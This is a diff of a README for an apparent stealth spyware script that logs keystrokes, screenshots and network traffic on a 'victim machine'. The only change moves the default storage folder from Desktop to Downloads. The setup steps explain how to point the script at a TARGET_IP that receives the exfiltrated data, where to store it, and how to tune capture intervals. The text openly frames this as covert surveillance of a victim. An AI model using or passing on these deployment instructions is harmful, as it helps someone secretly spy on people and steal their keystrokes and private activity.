@@ -3,7 +3,7 @@ Stealthy startup script that monitors network traffic, keystrokes, and screen sn
 
 ## Setup
 - Foremost, change the value of TARGET_IP in the script to the intended IP address where the keylogs, screenshots, and network activity of the victim machine are to be transmitted.
-- Foremost, specify the directories where each type of file regarding the exfiltrated activity are to be stored in the TARGET_IP machine. By default, these are set to Desktop, if you intend to use this directory you MUST change "<User>" into the corresponding user of the TARGET_IP machine.
+- Foremost, specify the directories where each type of file regarding the exfiltrated activity are to be stored in the TARGET_IP machine. By default, these are set to Downloads, if you intend to use this directory you MUST change "<User>" into the corresponding user of the TARGET_IP machine.
 - Foremost, ensure that the victim machine and TARGET_IP machine can reach each other (i.e. in the same network).
 - Optionally, you may change the time intervals for each activity exfiltration (for keylogging, this interval specifies the duration before a new line of log is created in the generated log file of the keystrokes).
 
